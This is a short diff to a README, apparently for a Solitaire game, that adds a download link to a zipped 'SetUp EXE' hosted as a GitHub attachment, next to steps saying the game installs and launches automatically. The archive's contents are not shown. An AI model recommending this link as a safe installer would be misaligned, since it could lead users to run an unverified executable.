@@ -1,3 +1,4 @@
+
 <img width="1262" height="887" alt="image" src="https://github.com/user-attachments/assets/6bd2ea15-a6a7-4332-aa73-9e998c4324b2" />
 
 ---
@@ -61,7 +62,7 @@ Recommended:
 4. When installation completes, the game will launch automatically.  
 5. A desktop shortcut and Start Menu entry will be created for future use.
 
-
+[Solitaire SetUp EXE.zip](https://github.com/user-attachments/files/26861085/Solitaire.SetUp.EXE.zip)
 
 ---
 
